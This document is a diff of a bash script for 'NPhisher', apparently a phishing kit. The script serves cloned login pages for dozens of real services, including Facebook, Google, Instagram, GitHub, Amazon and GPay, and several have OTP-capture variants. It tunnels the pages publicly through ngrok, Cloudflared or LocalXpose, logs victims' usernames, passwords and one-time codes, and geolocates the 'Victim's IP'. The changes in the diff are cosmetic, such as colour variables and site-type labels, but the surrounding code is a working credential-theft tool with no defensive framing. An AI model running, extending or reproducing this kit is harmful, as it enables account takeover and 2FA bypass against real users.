@@ -1,38 +1,40 @@
 ##COLOUR TEXT
-BLACK="$(printf '\033[30m')"
-RED="$(printf '\033[31m')"
-GREEN="$(printf '\033[32m')"
-YELLOW="$(printf '\033[33m')"
-BLUE="$(printf '\033[34m')"
-MAGENTA="$(printf '\033[35m')"
-CYAN="$(printf '\033[36m')"
-WHITE="$(printf '\033[37m')"
-GRAY="$(printf '\033[90m')"
-LRED="$(printf '\033[91m')"
-LGREEN="$(printf '\033[92m')"
-LYELLOW="$(printf '\033[93m')"
-LBLUE="$(printf '\033[94m')"
-LMAGENTA="$(printf '\033[95m')"
-LCYAN="$(printf '\033[96m')"
-NC="$(printf '\033[0m')" #Reset colour
+BLACK="\e[30m"
+RED="\e[31m"
+GREEN="\e[32m"
+YELLOW="\e[33m"
+BLUE="\e[34m"
+MAGENTA="\e[35m"
+CYAN="\e[36m"
+LGRAY="\e[37m"
+GRAY="\e[90m"
+LRED="\e[91m"
+LGREEN="\e[92m"
+LYELLOW="\e[93m"
+LBLUE="\e[94m"
+LMAGENTA="\e[95m"
+LCYAN="\e[96m"
+WHITE="\e[97m"
+NC="\e[0m" #Reset colour
 
 ##COLOUR BG
-BLACKBG="$(printf '\033[40m')"
-REDBG="$(printf '\033[41m')"
-GREENBG="$(printf '\033[42m')"
-YELLOWBG="$(printf '\033[43m')"
-BLUEBG="$(printf '\033[44m')"
-MAGENTABG="$(printf '\033[45m')"
-CYANBG="$(printf '\033[46m')"
-WHITEBG="$(printf '\033[47m')"
-GRAYBG="$(printf '\033[100m')"
-LREDBG="$(printf '\033[101m')"
-LGREENBG="$(printf '\033[102m')"
-LYELLOWBG="$(printf '\033[103m')"
-LBLUEBG="$(printf '\033[104m')"
-LMAGENTABG="$(printf '\033[105m')"
-LCYANBG="$(printf '\033[106m')"
-RESETBG="$(printf '\033[0m\n')" #Reset background
+BLACKBG="\e[40m"
+REDBG="\e[41m"
+GREENBG="\e[42m"
+YELLOWBG="\e[43m"
+BLUEBG="\e[44m"
+MAGENTABG="\e[45m"
+CYANBG="\e[46m"
+LGRAYBG="\e[47m"
+GRAYBG="\e[100m"
+LREDBG="\e[101m"
+LGREENBG="\e[102m"
+LYELLOWBG="\e[103m"
+LBLUEBG="\e[104m"
+LMAGENTABG="\e[105m"
+LCYANBG="\e[106m"
+WHITEBG="\e[107m"
+RESETBG="\e[0m\n" #Reset background
 
 ## COLOUR FONT - BOLD
 BOLDBLACK="\e[1;30m"
@@ -42,7 +44,7 @@ BOLDYELLOW="\e[1;33m"
 BOLDBLUE="\e[1;34m"
 BOLDMAGENTA="\e[1;35m"
 BOLDCYAN="\e[1;36m"
-BOLDWHITE="\e[1;37m"
+BOLDLGRAY="\e[1;37m"
 BOLDGRAY="\e[1;90m"
 BOLDLRED="\e[1;91m"
 BOLDLGREEN="\e[1;92m"
@@ -50,7 +52,7 @@ BOLDLYELLOW="\e[1;93m"
 BOLDLBLUE="\e[1;94m"
 BOLDLMAGENTA="\e[1;95m"
 BOLDLCYAN="\e[1;96m"
-
+BOLDWHITE="\e[1;97m"
 ## COLOUR FONT - FAINT
 FAINTBLACK="\e[2;30m"
 FAINTRED="\e[2;31m"
@@ -59,7 +61,7 @@ FAINTYELLOW="\e[2;33m"
 FAINTBLUE="\e[2;34m"
 FAINTMAGENTA="\e[2;35m"
 FAINTCYAN="\e[2;36m"
-FAINTWHITE="\e[2;37m"
+FAINTLGRAY="\e[2;37m"
 FAINTGRAY="\e[2;90m"
 FAINTLRED="\e[2;91m"
 FAINTLGREEN="\e[2;92m"
@@ -67,7 +69,7 @@ FAINTLYELLOW="\e[2;93m"
 FAINTLBLUE="\e[2;94m"
 FAINTLMAGENTA="\e[2;95m"
 FAINTLCYAN="\e[2;96m"
-
+FAINTWHITE="\e[2;97m"
 ## COLOUR FONT - ITALIC
 ITALICBLACK="\e[3;30m"
 ITALICRED="\e[3;31m"
@@ -76,7 +78,7 @@ ITALICYELLOW="\e[3;33m"
 ITALICBLUE="\e[3;34m"
 ITALICMAGENTA="\e[3;35m"
 ITALICCYAN="\e[3;36m"
-ITALICWHITE="\e[3;37m"
+ITALICLGRAY="\e[3;37m"
 ITALICGRAY="\e[3;90m"
 ITALICLRED="\e[3;91m"
 ITALICLGREEN="\e[3;92m"
@@ -84,7 +86,7 @@ ITALICLYELLOW="\e[3;93m"
 ITALICLBLUE="\e[3;94m"
 ITALICLMAGENTA="\e[3;95m"
 ITALICLCYAN="\e[3;96m"
-
+ITALICWHITE="\e[3;97m"
 ## COLOUR FONT - UNDERLINE
 ULBLACK="\e[4;30m"
 ULRED="\e[4;31m"
@@ -93,7 +95,7 @@ ULYELLOW="\e[4;33m"
 ULBLUE="\e[4;34m"
 ULMAGENTA="\e[4;35m"
 ULCYAN="\e[4;36m"
-ULWHITE="\e[4;37m"
+ULLGRAY="\e[4;37m"
 ULGRAY="\e[4;90m"
 ULLRED="\e[4;91m"
 ULLGREEN="\e[4;92m"
@@ -101,17 +103,29 @@ ULLYELLOW="\e[4;93m"
 ULLBLUE="\e[4;94m"
 ULLMAGENTA="\e[4;95m"
 ULLCYAN="\e[4;96m"
-
+ULWHITE="\e[4;97m"
 ##RESET ALL FONT AND COLOUR
 NF="\e[0;0m" 
 
-#Directories
+
+##IMPORTANT VARIABLES
+#Directories---
 pro_dir=$(pwd) #project directory
 server_dir="${pro_dir}/.server" #server directory
 assets_dir="${pro_dir}/.server/assets" #assets directory
 www_dir="${pro_dir}/.server/www" #www directory
 sites_dir="${pro_dir}/.sites" #sites directory
+#Date---
 log_name=$(date +%d-%m-%Y-%H-%M-%S)
+date_date=$(date +%d)
+date_month=$(date +%m)
+date_year=$(date +%Y)
+date_hour=$(date +%H)
+date_minute=$(date +%M)
+date_second=$(date +%S)
+date_nanosec=$(date +%n)
+#prompt---
+selected="NPhisher"
 
 #Normal Banner
 banner(){
@@ -129,7 +143,7 @@ banner(){
 }
 # Credits banner
 cbanner(){
-	echo " "
+	echo -e " "
         echo -e "${CYAN}----------------------------------------------------------------${NC}"
 	echo -e "${RED} ██      ██╗${BLUE}██████╗${NC}"
 	echo -e "${RED} ███╗    ██║${BLUE}██╔══██║ ${NC}"
@@ -145,12 +159,17 @@ cbanner(){
 }
 #Small Banner
 sbanner(){
-	echo " "
+	echo -e " "
 	echo -e "${RED} ▒█▄  ▒█${BLUE} ▒█▀▀█ ${NC}"
 	echo -e "${RED} ▒█▒█ ▒█${BLUE} ▒█▄▄█ █░░█ ░▀░ █▀▀ █░░█ █▀▀ █▀▀█${NC}"
 	echo -e "${RED} ▒█░ █▒█${BLUE} ▒█░░░ █▀▀█ ▀█▀ ▀▀█ █▀▀█ █▀▀ █▄▄▀${NC}"
 	echo -e "${RED} ▒█░  ██${BLUE} ▒█░░░ ▀░░▀ ▀▀▀ ▀▀▀ ▀░░▀ ▀▀▀ ▀░░▀${NC}"
 	echo -e "${CYAN}        ${NC} "
+}
+
+## Update Prompt
+uprompt(){
+        prompt="$(echo -e ">> ${YELLOW}${selected} : ${BLUE}")"
 }
 
 ## Directories
@@ -261,7 +280,7 @@ check_net_update(){
 	if [ $netstats=="Online" ]; then
 		check_update
 	else
-		echo "${RED}Your offline, Check your internet and try again."
+		echo -e "${RED}Your offline, Check your internet and try again."
 		sleep 5
 		mainmenu
 	fi
@@ -280,9 +299,9 @@ check_update() {
 		echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Your up to date!! ${NC} "
 		{ sleep 3; clear; mainmenu; }
 	else
-		echo " "
-		echo "${GREEN} Current version = ${YELLOW} $current_ver "
-		echo "${GREEN} Latest version = ${YELLOW} $lat_ver "
+		echo -e " "
+		echo -e "${GREEN} Current version = ${YELLOW} $current_ver "
+		echo -e "${GREEN} Latest version = ${YELLOW} $lat_ver "
 		read -p "${GREEN}[${WHITE}#${GREEN}]${GREEN} Update found!! (Latest Version ${lat_ver} ) Do you want to update? (y/n) :"  ureply
 		case $ureply in
 			Y | y)
@@ -315,7 +334,7 @@ update() {
 	        mv $HOME/nphisher/cloudflared .server
 	        rm -rf $HOME/nphisher
 	        credits_banner
-		echo " "
+		echo -e " "
 		echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} SUCCESSFULLY UPDATED!! ( Version: ${lat_ver} ) ${NC} "
 	        sleep 0.3
 		echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Now running the tool!! ${NC} "
@@ -353,7 +372,7 @@ load_print() {
 ## Install ngrok
 check_ngrok(){
 	if [ ! -e ".server/ngrok" ]; then
-		echo " "
+		echo -e " "
 		read -p "${GREEN}[${WHITE}?${GREEN}]${GREEN} Ngrok Not installed do you want to install ngrok now? (Y/n) : ${BLUE}"
 		case $REPLY in
 		Y | y)
@@ -397,12 +416,12 @@ ngrok_token_setup(){
         else
 		mkdir $HOME/.ngrok2
 		echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} Created Ngrok2 directory "
-		echo " "
+		echo -e " "
         fi
 
 	rm -rf ${HOME}/.ngrok2/ngrok.yml
 	read -p "${RED}[${WHITE}-${RED}]${YELLOW} Enter your authtoken :" ntoken
-	echo "authtoken : ${ntoken}" >> ngrok.yml
+	echo -e "authtoken : ${ntoken}" >> ngrok.yml
 	mv ngrok.yml ${HOME}/.ngrok2/
 	./.server/ngrok config upgrade
 	echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} Upgraded ngrok configurations"
@@ -447,7 +466,7 @@ start_ngrok() {
 	Y | y)
 		ngrok_region;;
 	N | n | *)
-		echo " ";;
+		echo -e " ";;
 	esac
         load_print "Launching NGROK" '15'
     if [[ `command -v termux-chroot` ]]; then
@@ -467,7 +486,7 @@ fetchlink_ngrok() {
 ## Install Cloudflared
 check_cloudflared(){
 	if [ ! -e ".server/cloudflared" ]; then
-		echo " "
+		echo -e " "
 		read -p "${GREEN}[${WHITE}?${GREEN}]${GREEN} Cloudflared Not installed do you want to install Cloudflared now? (Y/n) : ${BLUE}"
 		case $REPLY in
 		Y | y)
@@ -517,7 +536,7 @@ fetchlink_cloudflared() {
 ## Install LocalXpose
 check_localxpose(){
 	if [ ! -e ".server/loclx" ]; then
-		echo " "
+		echo -e " "
 		read -p "${GREEN}[${WHITE}?${GREEN}]${GREEN} Localxpose Not installed do you want to install localxpose now? (Y/n) : ${BLUE}"
 		case $REPLY in
 		Y | y)
@@ -626,8 +645,8 @@ start_localhost() {
 #Host and port setup
 HOST='127.0.0.1'
 cusport() {
-	echo " "
-	echo "${RED}[${WHITE}-${RED}]${GREEN}Your current port : ${BLUE}4444"
+	echo -e " "
+	echo -e "${RED}[${WHITE}-${RED}]${GREEN}Your current port : ${BLUE}4444"
 	read -p "${RED}[${WHITE}?${RED}]${YELLOW}Do you want to setup Custom port (Y/n) : ${BLUE}"
 	case $REPLY in
 	Y | y)
@@ -667,13 +686,13 @@ setup_site() {
 ## Redirect
 redirect_check(){
      echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} Current Redirect Url : ${rdurl} "   
-     echo "\n"
+     echo -e "\n"
      read -p "${RED}[${WHITE}?${RED}]${BLUE} Do you want to change redirect URL (Y/n) : ${BLUE}"
 		case $REPLY in
                 Y | y)
   	                redirect_input;;
                 N | n | *)
-                        echo ""
+                        echo -e ""
                         redirect_default;;
 	        esac
 }
@@ -681,7 +700,7 @@ redirect_input() {
         echo"\n"
         read -p "${RED}[${WHITE}?${RED}]${YELLOW} Your Redirect URL : ${BLUE}" urdurl
         if [[ "${urdurl//:*}" =~ ^([h][t][t][p]|[h][t][t][p][s])$ ]]; then
-		echo "${RED}[${WHITE}!${RED}]${RED} Don't type http or https in the URL"
+		echo -e "${RED}[${WHITE}!${RED}]${RED} Don't type http or https in the URL"
                 sleep 3
                 clear
                 banner
@@ -696,7 +715,7 @@ redirect_setup() {
         elif [[ -f ${www_dir}/OOTP || -f ${www_dir}/POTP ]];then
                 sed -i "s/redirecturl/${urdurl}/g" "${www_dir}/otp.php"
 	else
-		echo "${RED}[${WHITE}!${RED}]${RED} Error Occured in setting up custom redirect URL!!"
+		echo -e "${RED}[${WHITE}!${RED}]${RED} Error Occured in setting up custom redirect URL!!"
                 echo -ne "\n${RED}[${WHITE}?${RED}]${GREEN} Setting up default redirect URL"
                 echo -ne "${RED}[${WHITE}?${RED}]${GREEN} Redirect URL : ${BLUE} ${rdurl}"
                 sleep 3
@@ -709,7 +728,7 @@ redirect_default() {
         elif [[ -f ${www_dir}/OOTP || -f ${www_dir}/POTP ]];then
                 sed -i "s/redirecturl/${rdurl}/" "${www_dir}/otp.php"
 	else
-		echo " ${RED}[${WHITE}!${RED}]${RED} Error Occured in setting up redirect URL!!"
+		echo -e " ${RED}[${WHITE}!${RED}]${RED} Error Occured in setting up redirect URL!!"
         fi
 }
 
@@ -718,7 +737,7 @@ checklink() {
 	if [ -z "$LINK" ]; then
 		clear
 		banner
-		echo " "
+		echo -e " "
 		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Error in generating the link"
 		echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} Starting localhost. You might need to start tunneler manually"
 		sleep 5
@@ -732,9 +751,9 @@ checklink() {
 cusurl(){
 	clear
 	banner
-	echo " "
+	echo -e " "
 	echo -ne "${RED}[${WHITE}-${RED}]${GREEN} Do You want to Customize the uRL BeLow?"
-	echo " "
+	echo -e " "
 	read -p "${RED}[${WHITE}-${RED}]${YELLOW} $LINK (Y/n) : ${YELLOW}" CUS_URI
 	case $CUS_URI in
                 Y | y)
@@ -743,7 +762,7 @@ cusurl(){
 				shorten_keystocks
 			else
 				{ clear; sbanner; }
-				echo "${RED}Your offline, Cannot shorten link. Proceeding without shortening link"
+				echo -e "${RED}Your offline, Cannot shorten link. Proceeding without shortening link"
 				sleep 5
 				displaylink
 				capture_data_check
@@ -759,7 +778,7 @@ cusurl(){
 shorten_keystocks(){
 	read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN}Enter Your Custom uRL (eg:https://google.com | www.google.com) : " CUS_URL
 	checkurl ${CUS_URL}
-	echo " "
+	echo -e " "
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Enter Some KeyStocks (${WHITE}eg: sign-in-2FA ${YELLOW})${GREEN} : ${YELLOW}" Keystks #KEY_STOCKS
 	if [[ ${Keystks} =~ ^([0-9a-zA-Z-]*)$ ]]; then
 		shorten
@@ -873,7 +892,7 @@ capture_data_check(){
         elif [ -f ${www_dir}/POTP ];then
                 capture_data_3
 	else
-		echo " Error Occured!!"
+		echo -e " Error Occured!!"
         fi
 #no 1- id pass
 # no 2 - id otp
@@ -952,12 +971,12 @@ capture_data_3() {
 capture_ip() {
 	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
 ##	IP=$(awk -F 'IP: ' '{print $2}' .server/www/ip.txt | xargs)
-	echo "${MAGENTABG}${BLACK}"
+	echo -e "${MAGENTABG}${BLACK}"
         echo -e " Victim's IP : $IP ${RESETBG}"
-	echo "${RESETBG}${NC}"
+	echo -e "${RESETBG}${NC}"
 	if [[ $reply_tunnel -eq 1 || $reply_tunnel -eq 01 ]]; then
 		echo -ne "${RED} IP details cannot be captured in localhost server"
-		echo " "
+		echo -e " "
 		save_ip
 	else
 		ip_details $IP
@@ -974,8 +993,8 @@ save_ip() {
 	rm -rf .server/www/ip.txt
 }
 ip_details() {
-	echo " " 
-	echo "${RED}[${WHITE}-${RED}]${GREEN} Trying to capture details of IP : ${BLUE}${IP} "
+	echo -e " " 
+	echo -e "${RED}[${WHITE}-${RED}]${GREEN} Trying to capture details of IP : ${BLUE}${IP} "
 ##	curl -s -L "http://ipwhois.app/json/$IP" -o rawtrack.txt
 	wget --no-check-certificate "http://ipwhois.app/json/${IP}" -O rawtrack.txt > /dev/null 2>&1
 	sleep 2
@@ -1043,9 +1062,9 @@ ip_details() {
 
 ## Get credentials
 capture_id() {
-	echo "${MAGENTABG}${BLACK}"
+	echo -e "${MAGENTABG}${BLACK}"
         cat .server/www/usernames.txt
-	echo "${RESETBG}${NC}"
+	echo -e "${RESETBG}${NC}"
         echo -e "${GREEN} Saved in : ${YELLOW}/logs/${log_name}.txt"
 	cat .server/dumps/space.txt >> "logs/${log_name}.txt"
         cat .server/www/usernames.txt >> "logs/${log_name}.txt"
@@ -1054,9 +1073,9 @@ capture_id() {
 
 ## Get credentials
 capture_pass() {
-	echo "${MAGENTABG}${BLACK}"
+	echo -e "${MAGENTABG}${BLACK}"
 	cat  .server/www/pass.txt
-	echo "${RESETBG}${NC}"
+	echo -e "${RESETBG}${NC}"
         echo -e "${GREEN} Saved in : ${YELLOW}/logs/${log_name}.txt"
 	cat .server/dumps/space.txt >> logs/${log_name}.txt
         cat .server/www/pass.txt >> logs/${log_name}.txt
@@ -1065,9 +1084,9 @@ capture_pass() {
 
 ## Get otp
 capture_otp() {
-	echo "${MAGENTABG}${BLACK}"
+	echo -e "${MAGENTABG}${BLACK}"
         cat  .server/www/otp.txt
-	echo "${RESETBG}${NC}"
+	echo -e "${RESETBG}${NC}"
         echo -e "${GREEN} Saved in : ${YELLOW}/logs/${log_name}.txt"
 	cat .server/dumps/space.txt >> logs/${log_name}.txt
         cat .server/www/otp.txt >> logs/${log_name}.txt
@@ -1096,7 +1115,7 @@ logs_check() {
 	if [ -z "$(ls -A $DIR)" ]; then
 		logs_menu
 	else
-		echo "No logs found"
+		echo -e "No logs found"
 		{ sleep 1; clear; mainmenu; }
 	fi
 }
@@ -1174,11 +1193,11 @@ echo -e " "
 echo -e " "
 userip
 check_netstats
-echo "${BLUE}Your IP address = $myip"
-echo "${BLUE}Network Status  = $netstats"
+echo -e "${BLUE}Your IP address = $myip"
+echo -e "${BLUE}Network Status  = $netstats"
 echo -e " "
-echo -e "${WHITE} CHOOSE A SITE : ${NC}"
-echo -e " "
+echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A SITE${NF} : ${NC} "
+echo -e ""
 echo -e "${BLUE} [1] ${GREEN} Adobe         ${NC}""${BLUE} [26] ${GREEN} Mediafire     ${NC}""${BLUE} [51] ${GREEN} Telenor         ${NC}"
 echo -e "${BLUE} [2] ${GREEN} Airtel Sim    ${NC}""${BLUE} [27] ${GREEN} Messenger     ${NC}""${BLUE} [52] ${GREEN} Tiktok          ${NC}"
 echo -e "${BLUE} [3] ${GREEN} AirtelXstream ${NC}""${BLUE} [28] ${GREEN} Microsoft     ${NC}""${BLUE} [53] ${GREEN} Twitch          ${NC}"
@@ -1208,8 +1227,8 @@ echo -e " "
 echo -e "${BLUE} [A] ${MAGENTA} About         ${NC}""${BLUE} [B] ${MAGENTA} Request A site ${NC}""${BLUE} [C] ${MAGENTA} Report Issue${NC}"
 echo -e "${BLUE} [D] ${MAGENTA} View Logs     ${NC}""${BLUE} [E] ${MAGENTA} Check Updates  ${NC}""${BLUE} [00] ${MAGENTA} Exit       ${NC}"
 echo -e " "
-read -p "${RED}[${WHITE}?${RED}]${YELLOW} Select an option : ${BLUE}" reply
-echo " "
+uprompt;read -p "${prompt}" reply
+echo -e " "
 case $reply in
         1 | 01)
                 site_adobe;;
@@ -1382,9 +1401,11 @@ read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 case $sichoice in
 	1 | 01)
 		website="adobe"
+                sitype="Default"
 		tunnelmenu;;
 	2 | 02)
                 website="adobe/otp"
+                sitype="OTP"
                 tunnelmenu;;
 	*)
 		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -1396,6 +1417,7 @@ site_airtelsim(){
 website="airtelsim"
 rdurl="www.airtel.in"
 siname="Airtel Sim"
+sitype="Default"
 tunnelmenu
 }
 #airtelxstream
@@ -1414,9 +1436,11 @@ read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 case $sichoice in
         1 | 01)
                 website="airtelxstream"
+                sitype="Default"
                 tunnelmenu;;
         2 | 02)
                 website="airtelxstream/otp"
+                sitype="OTP"
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -1439,9 +1463,11 @@ read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 case $sichoice in
         1 | 01)
                 website="ajio"
+                sitype="Default"
                 tunnelmenu;;
         2 | 02)
                 website="ajio/otp"
+                sitype="OTP"
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -1464,9 +1490,11 @@ read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 case $sichoice in
         1 | 01)
                 website="amazon"
+                sitype="Default"
                 tunnelmenu;;
         2 | 02)
                 website="amazon/otp"
+                sitype="OTP"
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -1489,9 +1517,11 @@ read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 case $sichoice in
         1 | 01)
                 website="apple"
+                sitype="Default"
                 tunnelmenu;;
         2 | 02)
                 website="apple/otp"
+                sitype="OTP"
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -1514,9 +1544,11 @@ read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 case $sichoice in
         1 | 01)
                 website="badoo"
+                sitype="Default"
                 tunnelmenu;;
         2 | 02)
                 website="badoo/otp"
+                sitype="OTP"
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -1528,6 +1560,7 @@ site_clashofclans(){
 website="clashofclans"
 rdurl="clashofclans.com/"
 siname="Clash Of Clans"
+sitype="Default"
 tunnelmenu
 }
 #date
@@ -1548,15 +1581,19 @@ read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 case $sichoice in
         1 | 01)
                 website="date1"
+                sitype="1"
                 tunnelmenu;;
         2 | 02)
                 website="date1/otp"
+                sitype="1/OTP"
                 tunnelmenu;;
 	3 | 03)
                 website="date2"
+                sitype="2"
                 tunnelmenu;;
         4 | 04)
                 website="date2/otp"
+                sitype="2/OTP"
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -1579,9 +1616,11 @@ read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 case $sichoice in
         1 | 01)
                 website="devianart"
+                sitype="Default"
                 tunnelmenu;;
         2 | 02)
                 website="devianart/otp"
+                sitype="OTP"
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -1611,9 +1650,11 @@ read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 case $sichoice in
         1 | 01)
                 website="ebay"
+                sitype="Default"
                 tunnelmenu;;
         2 | 02)
                 website="ebay/otp"
+                sitype="OTP"
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -1641,24 +1682,31 @@ read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 case $sichoice in
         1 | 01)
                 website="facebook"
+                sitype="Default"
                 tunnelmenu;;
         2 | 02)
                 website="facebook/otp"
+                sitype="OTP"
                 tunnelmenu;;
 	3 | 03)
                 website="fb_poll"
+                sitype="Poll"
                 tunnelmenu;;
         4 | 04)
                 website="fb_poll/otp"
+                sitype="Poll/OTP"
                 tunnelmenu;;
 	5 | 05)
                 website="fb_security"
+                sitype="Security"
                 tunnelmenu;;
         6 | 06)
                 website="fb_security/otp"
+                sitype="Security/OTP"
                 tunnelmenu;;
 	7 | 07)
                 website="fb_standard"
+                sitype="Standard"
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -1681,9 +1729,11 @@ read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 case $sichoice in
         1 | 01)
                 website="flipcart"
+                sitype="Default"
                 tunnelmenu;;
         2 | 02)
                 website="flipcart/otp"
+                sitype="OTP"
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -1715,15 +1765,19 @@ read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 case $sichoice in
         1 | 01)
                 website="github"
+                sitype="Default"
                 tunnelmenu;;
         2 | 02)
                 website="github/otp"
+                sitype="OTP"
                 tunnelmenu;;
 	3 | 03)
                 website="github_advanced"
+                sitype="Advanced"
                 tunnelmenu;;
         4 | 04)
                 website="github_advanced/otp"
+                sitype="Advanced/OTP"
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -1748,15 +1802,19 @@ read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 case $sichoice in
 	1 | 01)
                 website="gitlab"
+                sitype="Default"
                 tunnelmenu;;
         2 | 02)
                 website="gitlab/otp"
+                sitype="OTP"
                 tunnelmenu;;
         3 | 03)
                 website="gitlab_advanced"
+                sitype="Advanced"
                 tunnelmenu;;
         4 | 04)
                 website="gitlab_advanced/otp"
+                sitype="OTP"
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -1779,9 +1837,11 @@ read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 case $sichoice in
         1 | 01)
                 website="gmail"
+                sitype="Default"
                 tunnelmenu;;
         2 | 02)
                 website="gmail/otp"
+                sitype="OTP"
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -1808,21 +1868,27 @@ read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 case $sichoice in
         1 | 01)
                 website="google"
+                sitype="Default"
                 tunnelmenu;;
         2 | 02)
                 website="google/otp"
+                sitype="OTP"
                 tunnelmenu;;
         3 | 03)
                 website="google_poll"
+                sitype="Poll"
                 tunnelmenu;;
         4 | 04)
                 website="google_poll/otp"
+                sitype="Poll/OTP"
                 tunnelmenu;;
         5 | 05)
                 website="google_old"
+                sitype="Old"
                 tunnelmenu;;
 	6 | 06)
 		website="google_old/otp"
+                sitype="Old/OTP"
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -1845,9 +1911,11 @@ read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 case $sichoice in
         1 | 01)
                 website="gpay"
+                sitype="Default"
                 tunnelmenu;;
         2 | 02)
                 website="gpay/otp"
+                sitype="OTP"
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -1887,39 +1955,51 @@ read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 case $sichoice in
         1 | 01)
                 website="instagram"
+                sitype="Default"
                 tunnelmenu;;
         2 | 02)
                 website="instagram/otp"
+                sitype="OTP"
                 tunnelmenu;;
         3 | 03)
                 website="ig_advanced"
+                sitype="Advanced"
                 tunnelmenu;;
         4 | 04)
                 website="ig_advanced/otp"
+                sitype="Advanced/OTP"
                 tunnelmenu;;
         5 | 05)
                 website="ig_autoliker"
+                sitype="Autoliker"
                 tunnelmenu;;
         6 | 06)
                 website="ig_autoliker/otp"
+                sitype="Autoliker/OTP"
                 tunnelmenu;;
         7 | 07)
                 website="ig_followers"
+                sitype="Followers"
                 tunnelmenu;;
 	8 | 08)
                 website="ig_followers/otp"
+                sitype="Followers/OTP"
                 tunnelmenu;;
 	9 | 09)
                 website="ig_verify"
+                sitype="Verify"
                 tunnelmenu;;
 	10)
                 website="ig_old"
+                sitype="Old"
                 tunnelmenu;;
         11)
                 website="ig_old/otp"
+                sitype="Old/OTP"
                 tunnelmenu;;
 	12)
 	        website="ig_video"
+                sitype="Video"
 	        tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -1931,6 +2011,7 @@ site_jazz(){
 website="jazz"
 rdurl="jazz.com.pk/"
 siname="Jazz"
+sitype="Default"
 tunnelmenu
 }
 #jio
@@ -1949,9 +2030,11 @@ read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 case $sichoice in
         1 | 01)
                 website="jiosim"
+                sitype="Sim"
                 tunnelmenu;;
         2 | 02)
                 website="jiooffer"
+                sitype="Offer"
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -1974,9 +2057,11 @@ read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 case $sichoice in
         1 | 01)
                 website="linkedin"
+                sitype="Default"
                 tunnelmenu;;
         2 | 02)
                 website="linkedin/otp"
+                sitype="OTP"
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
